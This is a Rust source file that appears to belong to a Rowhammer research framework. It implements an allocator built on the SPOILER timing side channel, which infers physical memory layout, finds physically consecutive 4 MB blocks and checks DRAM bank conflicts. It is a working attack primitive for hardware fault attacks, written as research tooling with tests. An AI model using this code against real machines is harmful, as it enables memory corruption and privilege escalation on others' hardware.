use std::fmt::Display;
use std::ops::{Deref, Range};
use std::ptr::null_mut;

use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
use itertools::Itertools;
use log::{debug, error, info, log_enabled, warn};
use swage_core::allocator::ConsecAllocator;
use swage_core::memory::{
    BytePointer, ConsecBlocks, DRAMAddr, FormatPfns, GetConsecPfns, LinuxPageMapError,
    MemConfiguration, Memory, PfnResolver, TimerError, construct_memory_tuple_timer,
};
use swage_core::util::Size;
use swage_core::util::{NamedProgress, PAGE_SIZE, Size::MB};
use swage_core::util::{mmap, munmap};
use thiserror::Error;
/// Timing threshold for determining memory conflicts in the SPOILER attack.
///
/// The threshold value determines when two memory accesses are considered to
/// conflict (access the same DRAM bank), based on timing measurements.
#[derive(Clone)]
pub struct ConflictThreshold(u64);

/// SPOILER attack-based memory allocator.
///
/// Uses timing side-channels to infer physical address layout and obtain
/// consecutive physical memory blocks. The SPOILER attack leverages CPU
/// microarchitectural behavior to determine virtual address pairs with a
/// common physical address suffix.
///
/// # Implementation
///
/// Implements [`swage_core::allocator::ConsecAllocator`] with 4MB block size.
///
/// # References
///
/// Based on: Islam et al., "SPOILER: Speculative Load Hazards Boost
/// Rowhammer and Cache Attacks" USENIX 2019.
pub struct Spoiler {
    mem_config: MemConfiguration,
    conflict_threshold: ConflictThreshold,
    progress: Option<MultiProgress>,
}

impl Spoiler {
    /// Constructor for Spoiler allocator
    pub fn new(
        mem_config: MemConfiguration,
        conflict_threshold: ConflictThreshold,
        progress: Option<MultiProgress>,
    ) -> Self {
        Self {
            mem_config,
            conflict_threshold,
            progress,
        }
    }
}

#[derive(Debug, thiserror::Error)]
pub enum Error {
    #[error(transparent)]
    ConsecPfns(#[from] swage_core::memory::ConsecPfnsError),
    #[error(transparent)]
    #[allow(clippy::enum_variant_names)]
    IoError(#[from] std::io::Error),
    #[error(transparent)]
    LinuxPageMapError(#[from] LinuxPageMapError),
    #[error("Failed to construct memory tuple timer: {0}")]
    Timer(#[from] TimerError),
}

impl ConsecAllocator for Spoiler {
    type Error = Error;
    fn block_size(&self) -> Size {
        MB(4)
    }

    fn alloc_consec_blocks(&mut self, size: Size) -> Result<ConsecBlocks, Self::Error> {
        //let hugeblock_len = 1 << 30;
        //let v = mmap_block(null_mut(), hugeblock_len);

        let mut blocks: Vec<Memory> = vec![];
        const BLOCK_SIZE: usize = MB(4).bytes();
        let required_blocks = size.bytes().div_ceil(BLOCK_SIZE);
        let timer = construct_memory_tuple_timer()?;
        let p = self.progress.as_ref().map(|p| {
            p.add(
                ProgressBar::new(required_blocks as u64)
                    .with_style(ProgressStyle::named_bar("Allocating blocks")),
            )
        });
        if let Some(p) = &p {
            p.set_position(0);
        }
        info!(
            "Running SPOILER attack to find {} blocks. This might take some time...",
            required_blocks
        );
        let mut trash_buffers = vec![];
        let thp = Self::allocate_2m_aligned()?;
        while blocks.len() < required_blocks {
            let round_blocks = match self.spoiler_round(required_blocks, &mut trash_buffers) {
                Ok(blocks) => blocks,
                Err(e) => {
                    error!("Spoiler round failed: {}", e);
                    continue;
                }
            };
            info!("Current blocks: {:?}", blocks);
            info!(
                "Banks: {:?}",
                blocks
                    .iter()
                    .map(|b| DRAMAddr::from_virt(
                        b.pfn().unwrap_or_default().into(),
                        &self.mem_config
                    ))
                    .collect_vec()
            );
            for block in round_blocks {
                if blocks.len() >= required_blocks {
                    block.dealloc();
                    continue;
                }
                // check for same bank as THP

                let timing =
                    unsafe { timer.time_subsequent_access_from_ram(block.ptr(), thp.ptr(), 10000) };
                let same_bank = timing >= self.conflict_threshold.0;
                if !same_bank {
                    warn!(
                        "Bank check failed: {} < {} for blocks {:?} and {:?}",
                        timing, self.conflict_threshold.0, block, thp
                    );
                    block.dealloc();
                    continue;
                }
                // PFN based check to confirm timings (for debugging, skipped if PageMap ist not available)
                let pfn = block.pfn();
                let last_pfn = blocks.last().map(|b| b.pfn()).transpose();
                if let (Ok(pfn), Ok(Some(last_pfn))) = (&pfn, &last_pfn) {
                    let bank = DRAMAddr::from_virt((*pfn).into(), &self.mem_config).bank;
                    if bank != 0 {
                        debug!("Not bank 0: {}", bank);
                        //block.dealloc();
                        //continue;
                    }
                    let last_bank = DRAMAddr::from_virt((*last_pfn).into(), &self.mem_config).bank;
                    assert_eq!(bank, last_bank);
                } else {
                    warn!("Skipped PFN check: {:?} {:?}", pfn, last_pfn);
                }
                info!(
                    "Adding block (phys) {:?}:\n{}",
                    DRAMAddr::from_virt(block.pfn()?.into(), &self.mem_config),
                    block.consec_pfns()?.format_pfns()
                );
                if let Some(p) = &p {
                    p.inc(1);
                }
                blocks.push(block);
            }
        }
        for buffer in trash_buffers {
            buffer.dealloc();
        }
        if let Some(p) = &p {
            p.finish();
        }
        Ok(ConsecBlocks { blocks })
    }
}

struct CArray<T> {
    data: *const T,
    len: usize,
}

impl<T> CArray<T> {
    fn new(data: *const T, len: usize) -> Self {
        assert!(!data.is_null());
        assert_ne!(len, 0);
        Self { data, len }
    }
}

impl<T> Deref for CArray<T> {
    type Target = [T];
    fn deref(&self) -> &[T] {
        unsafe { std::slice::from_raw_parts(self.data, self.len) }
    }
}

#[derive(Debug, Error)]
enum SpoilerRoundError {
    #[error("No candidates found")]
    NoCandidatesFound,
    #[error(transparent)]
    IoError(#[from] std::io::Error),
}

impl Spoiler {
    /// allocate a 2 MB physically aligned memory block.
    fn allocate_2m_aligned() -> Result<Memory, std::io::Error> {
        const ALIGNMENT: usize = MB(2).bytes();
        let aligned = unsafe {
            libc::mmap(
                null_mut(),
                ALIGNMENT,
                libc::PROT_READ | libc::PROT_WRITE,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                -1,
                0,
            )
        };
        if aligned == libc::MAP_FAILED {
            return Err(std::io::Error::last_os_error());
        }
        unsafe { libc::memset(aligned, 0, ALIGNMENT) };
        if unsafe { libc::madvise(aligned, ALIGNMENT, libc::MADV_COLLAPSE) } != 0 {
            return Err(std::io::Error::last_os_error());
        }
        unsafe { libc::mlock(aligned, ALIGNMENT) };
        if log_enabled!(log::Level::Debug)
            && let Ok(consecs) = (aligned, ALIGNMENT).consec_pfns()
        {
            debug!("Aligned PFNs: {:?}", consecs);
        }
        assert_eq!(aligned as usize & (ALIGNMENT - 1), 0);
        assert_eq!(
            aligned.pfn().unwrap_or_default().as_usize() & (ALIGNMENT - 1),
            0
        );
        Ok(Memory::new(aligned as *mut u8, ALIGNMENT))
    }

    /// Perform a spoiler round to find consecutive memory blocks.
    fn spoiler_round(
        &self,
        max_candidates: usize,
        trash_buffers: &mut Vec<Memory>,
    ) -> Result<Vec<Memory>, SpoilerRoundError> {
        const DUMMY_BUF_SIZE: usize = MB(2048).bytes();
        const SEARCH_BUFFER_SIZE: usize = MB(2048).bytes();
        const CONT_SIZE: usize = MB(8).bytes();
        let dummy_buf: *mut u8 = mmap(null_mut(), DUMMY_BUF_SIZE); // dummy buffer to collect small page blocks
        let aligned = Self::allocate_2m_aligned()?;
        debug!("Base PFN: {:p}", aligned.pfn().unwrap_or_default());
        let search_buffer = mmap(null_mut(), SEARCH_BUFFER_SIZE);
        unsafe { munmap(dummy_buf, DUMMY_BUF_SIZE) };
        let spoiler_candidates =
            spoiler_candidates(search_buffer, SEARCH_BUFFER_SIZE, aligned.ptr(), CONT_SIZE);
        debug!("Base PFN: {:p}", aligned.pfn().unwrap_or_default());
        aligned.dealloc();
        if spoiler_candidates.is_empty() {
            trash_buffers.push(Memory::new(search_buffer, SEARCH_BUFFER_SIZE));
            return Err(SpoilerRoundError::NoCandidatesFound);
        }
        debug!("Found {} candidates", spoiler_candidates.len());
        debug!("{:?}", spoiler_candidates);

        let progress = self.progress.as_ref().map(|progress| {
            progress.add(
                ProgressBar::new(spoiler_candidates.len() as u64)
                    .with_style(ProgressStyle::named_bar("Spoiler round")),
            )
        });

        let mut blocks = vec![];
        let mut intervals = Intervals::new();
        for candidate in spoiler_candidates.into_iter().rev() {
            if blocks.len() >= max_candidates {
                break;
            }
            if let Some(p) = &progress {
                p.inc(1)
            }
            if intervals.contains(candidate.start) || intervals.contains(candidate.end) {
                debug!("Skipping candidate {:?}: overlaps with previous", candidate);
                continue;
            }
            let addr = unsafe { search_buffer.byte_add(candidate.start * PAGE_SIZE) };
            assert_eq!(candidate.end - candidate.start, CONT_SIZE / PAGE_SIZE);
            let block = Memory::new(addr, self.block_size().bytes());
            if let Ok(consecs) = block.consec_pfns() {
                debug!("Found candidate: {}", consecs.format_pfns());
                if (consecs[0].end - consecs[0].start).as_usize() != MB(4).bytes() {
                    warn!("Not a 4 MB block!");
                    //continue;
                }
            } else {
                debug!("Found candidate, but failed to resolve PFNs (are we root?)");
            }
            intervals.add(candidate);
            debug!("Current ranges: {}", intervals);
            blocks.push(block);
        }
        // munmap remaining pages
        blocks.sort_by_key(|b| b.ptr() as usize);
        let mut base = search_buffer;
        let search_buf_end = unsafe { search_buffer.byte_add(SEARCH_BUFFER_SIZE - 1) };
        for block in &blocks {
            if base >= search_buf_end {
                break;
            }
            let start = block.ptr() as usize;
            let unused_size = start - base as usize;
            trash_buffers.push(Memory::new(base, unused_size));
            base = unsafe { block.ptr().byte_add(block.len()) };
        }
        if base < search_buf_end {
            let unused_size = search_buf_end as usize - base as usize;
            trash_buffers.push(Memory::new(base, unused_size));
        }
        Ok(blocks)
    }
}

#[cfg(feature = "spoiler_dump")]
const MEASURE_LOG: &str = "log/measurements.csv";
#[cfg(feature = "spoiler_dump")]
const DIFF_LOG: &str = "log/diffs.csv";

/// Find candidates for consecutive memory blocks for a given read offset.
///
/// This returns a Range for start an end index for each candidate.
fn spoiler_candidates(
    buf: *mut u8,
    buf_size: usize,
    read_page: *mut u8,
    continuous_size: usize,
) -> Vec<Range<usize>> {
    assert!(!buf.is_null(), "null buffer");
    assert!(buf_size > 0, "zero-sized buffer");
    assert!(
        buf_size.is_multiple_of(MB(1).bytes()),
        "buffer size must be a multiple of MB"
    );
    assert!(continuous_size > 0, "zero-sized continuous_size");
    assert_eq!(
        continuous_size % MB(1).bytes(),
        0,
        "continuous_size must be a multiple of 1 MB"
    );

    const THRESH_LOW: u64 = 400;
    const THRESH_HIGH: u64 = 800;

    const PAGES_PER_MB: usize = MB(1).bytes() / PAGE_SIZE;

    let page_count = 256 * buf_size / MB(1).bytes(); // 256 pages per MB

    // measure the buffer using the spoiler primitive
    let measurements = unsafe { crate::spoiler_measure(buf, buf_size, read_page) };

    let diff_buf =
        unsafe { Vec::from(&CArray::new(crate::diffs(measurements), page_count) as &[u64]) };
    #[cfg(feature = "spoiler_dump")]
    {
        let meas_buf = unsafe {
            Vec::from(&CArray::new(crate::measurements(measurements), page_count) as &[u64])
        };
        // write measurements to MEASURE_LOG file
        let mut file = OpenOptions::new()
            .append(true)
            .create(true)
            .open(MEASURE_LOG)
            .unwrap();
        for (idx, measurement) in meas_buf.iter().enumerate() {
            writeln!(file, "{},{},{}", read_page_offset, idx, measurement).unwrap();
        }
        drop(file);
        // write diffs to DIFF_LOG file
        let mut file = OpenOptions::new()
            .append(true)
            .create(true)
            .open(DIFF_LOG)
            .unwrap();
        for (idx, diff) in diff_buf.iter().enumerate() {
            writeln!(file, "{},{},{}", read_page_offset, idx, diff).unwrap();
        }
        drop(file);
    }
    // find peaks in diff_buf. Peaks are read accesses to pages stalled caused by read-after-write pipeline conflicts.
    let peaks = diff_buf.peaks_indices(THRESH_LOW..THRESH_HIGH);
    let peak_distances = peaks
        .iter()
        .tuple_windows()
        .enumerate()
        .map(|(idx, (a, b))| (idx, b - a))
        .collect_vec();
    debug!("peak_distances: {:?}", peak_distances);
    unsafe { crate::spoiler_free(measurements) };
    // find `cont_window_size` distances 256 pages apart
    let cont_window_size = continuous_size / MB(1).bytes(); // cont window size in MB
    peak_distances
        // slide over peaks in windows of size `cont_window_size`
        .windows(cont_window_size)
        // keep only windows where all peaks are 1 MB apart
        .filter(|window| window.iter().all(|(_, dist)| *dist == PAGES_PER_MB))
        // convert window to start and end index
        .map(|window| peaks[window[0].0]..peaks[window[cont_window_size - 1].0 + 1])
        .collect_vec()
}

/// A collection of intervals.
struct Intervals<T>(Vec<Range<T>>);

impl<T> Intervals<T> {
    fn new() -> Self {
        Self(vec![])
    }
    fn add(&mut self, interval: Range<T>) {
        self.0.push(interval);
    }
}

impl<T: Ord> Intervals<T> {
    /// Check if a point is contained in any of the intervals.
    fn contains(&self, point: T) -> bool {
        self.0.iter().any(|range| range.contains(&point))
    }
}

/// Display implementation for Intervals.
impl<T: Copy + Display + Ord> Display for Intervals<T> {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "{}",
            self.0
                .iter()
                .sorted_by_key(|r| r.start)
                .map(|range| format!("[{}, {})", range.start, range.end))
                .join("")
        )
    }
}

trait PeakIndices<T> {
    fn peaks_indices(&self, peak_range: Range<T>) -> Vec<usize>;
}

impl<T> PeakIndices<T> for Vec<T>
where
    T: PartialOrd,
{
    fn peaks_indices(&self, peak_range: Range<T>) -> Vec<usize> {
        let mut peaks = vec![];
        for (idx, x) in self.iter().enumerate() {
            if peak_range.contains(x) {
                peaks.push(idx);
            }
        }
        peaks
    }
}

impl From<u64> for ConflictThreshold {
    fn from(value: u64) -> Self {
        Self(value)
    }
}

#[cfg(test)]
mod tests {
    use std::ptr::null_mut;
    use swage_core::memory::{FormatPfns, GetConsecPfns, Memory};
    use swage_core::util::{PAGE_SIZE, Size::MB};
    use swage_core::util::{compact_mem, mmap, munmap};

    use super::{Intervals, spoiler_candidates};

    #[test]
    #[ignore = "spoiler test needs root permissions. This test is mainly a playground for the spoiler strategy."]
    fn test_spoiler() {
        compact_mem().unwrap();

        let b: *mut u8 = mmap(null_mut(), MB(2048).bytes()); // dummy buffer to collect small page blocks
        const BUF_SIZE: usize = MB(512).bytes(); // buf size in MB
        let buf: *mut u8 = mmap(null_mut(), BUF_SIZE);
        let block = Memory::new(buf, BUF_SIZE);
        let pfns = block.consec_pfns().unwrap().format_pfns();
        println!("PFN ranges: {}", pfns);
        assert_ne!(buf, null_mut());
        let consec_size = MB(4).bytes();
        for offset in 0..256 * 8 {
            let spoiler_candidates = spoiler_candidates(
                buf,
                BUF_SIZE,
                unsafe { buf.byte_add(offset * PAGE_SIZE) },
                consec_size,
            );
            println!(
                "Found {} spoiler_candidates: {:?}",
                spoiler_candidates.len(),
                spoiler_candidates
            );
            //let mut offset = None;
            for candidate in spoiler_candidates {
                let (start, end) = (candidate.start, candidate.end);
                assert!(start < end);
                assert_eq!(end - start, MB(8).bytes() / PAGE_SIZE);
                let start = unsafe { buf.byte_add(start * PAGE_SIZE) };
                println!("Start: {:x}", start as usize);
                let block = Memory::new(start, consec_size);
                let pfns = block.consec_pfns().unwrap().format_pfns();
                println!("PFN ranges:\n{}", pfns);
                /*
                if offset.is_none() {
                    offset = block.pfn_offset(&mem_config, bs_config.threshold, &*timer, None);
                }
                println!("PFN Offset: {:?}", offset);
                if let Some(offset) = offset {
                    let aligned_va = block.addr(offset * ROW_SIZE) as usize;
                    let pfn = block.pfn().unwrap() as usize;
                    assert_eq!(aligned_va & 0xFCFFF, pfn & 0xFCFFF);
                }
                */
                let end = unsafe { buf.byte_add(end * PAGE_SIZE) };
                assert_eq!(end as usize - start as usize, MB(8).bytes());
            }
        }
        unsafe {
            munmap(buf, BUF_SIZE);
            munmap(b, MB(2048).bytes());
        }
    }

    #[test]
    fn test_intervals() {
        let mut intervals = Intervals::new();
        intervals.add(0..10);
        intervals.add(10..20);
        intervals.add(31..41);
        for i in -10..0 {
            assert!(!intervals.contains(i));
        }
        for i in 0..20 {
            assert!(intervals.contains(i));
        }
        for i in 20..31 {
            assert!(!intervals.contains(i));
        }
        for i in 31..41 {
            assert!(intervals.contains(i));
        }
        for i in 41..=50 {
            assert!(!intervals.contains(i));
        }
    }
}
